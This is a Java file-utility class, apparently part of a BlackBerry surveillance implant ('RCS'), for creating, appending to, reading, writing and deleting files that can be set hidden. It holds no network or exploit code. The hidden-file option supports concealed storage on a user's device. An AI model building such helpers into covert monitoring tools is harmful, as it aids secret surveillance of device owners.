/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : AutoFlashFile.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.fs;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.OutputStream;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;

import net.rim.device.api.io.IOUtilities;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Utils;

public class AutoFlashFile {
    private String filename;
    FileConnection fconn;
    DataInputStream is;
    OutputStream os;

    boolean hidden;
    boolean autoclose;

    public AutoFlashFile(String filename, boolean hidden) {
        this.filename = filename;
        this.hidden = hidden;
    }

    public synchronized boolean append(byte[] message) {
        try {
            fconn = (FileConnection) Connector.open(filename,
                    Connector.READ_WRITE);
            Check.asserts(fconn != null, "file fconn null");

            long size = fconn.fileSize();
            os = fconn.openOutputStream(size);
            Check.asserts(os != null, "os null");

            os.write(message);

        } catch (IOException e) {
            System.out.println(e.getMessage());
            e.printStackTrace();
            return false;
        } finally {

            close();
        }

        return true;
    }

    public synchronized boolean append(int value) {
        byte[] repr;
        repr = Utils.intToByteArray(value);
        return append(repr);
    }

    public synchronized boolean append(String message) {
        return append(message.getBytes());
    }

    private synchronized void close() {
        try {
            if (null != is) {
                is.close();
            }

            if (null != os) {
                os.close();
            }

            if (null != fconn) {
                fconn.close();
            }

        } catch (IOException e) {
            System.out.println(e.getMessage());
        }
    }

    public synchronized boolean create() {
        try {

            fconn = (FileConnection) Connector.open(filename,
                    Connector.READ_WRITE);
            Check.asserts(fconn != null, "fconn null");

            if (fconn.exists()) {
                fconn.truncate(0);
            } else {
                fconn.create();
                os = fconn.openDataOutputStream();

            }

            fconn.setHidden(hidden);
            Check.asserts(fconn.isHidden() == hidden, "Not Hidden as expected");
        } catch (IOException e) {
            System.out.println(e.getMessage());
            e.printStackTrace();
            return false;
        } finally {
            close();
        }

        Check.ensures(exists(), "not created");
        return true;
    }

    public synchronized void delete() {
        try {
            fconn = (FileConnection) Connector.open(filename,
                    Connector.READ_WRITE);
            Check.asserts(fconn != null, "file fconn null");

            if (fconn.exists()) {
                fconn.delete();
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            close();
        }
    }

    public synchronized boolean exists() {
        try {
            fconn = (FileConnection) Connector.open(filename, Connector.READ);
            Check.asserts(fconn != null, "fconn null");

            return fconn.exists();

        } catch (IOException e) {
            System.out.println(e.getMessage());
            return false;
        } finally {
            close();
        }
    }

    public synchronized byte[] read() {
        byte[] data = null;
        FileConnection fconn = null;

        try {
            fconn = (FileConnection) Connector.open(filename, Connector.READ);
            Check.asserts(fconn != null, "file fconn null");

            is = fconn.openDataInputStream();
            data = IOUtilities.streamToBytes(is);
        } catch (IOException e) {
            System.out.println(e.getMessage());
        } finally {
            close();
        }

        return data;
    }

    public synchronized boolean write(byte[] message) {
        FileConnection fconn = null;

        try {
            fconn = (FileConnection) Connector.open(filename, Connector.WRITE);
            Check.asserts(fconn != null, "file fconn null");

            os = fconn.openOutputStream();
            os.write(message);

        } catch (IOException e) {
            System.out.println(e.getMessage());
            return false;
        } finally {
            close();
        }

        return true;

    }

    public synchronized boolean write(int value) {
        byte[] repr = Utils.intToByteArray(value);
        return write(repr);
    }

}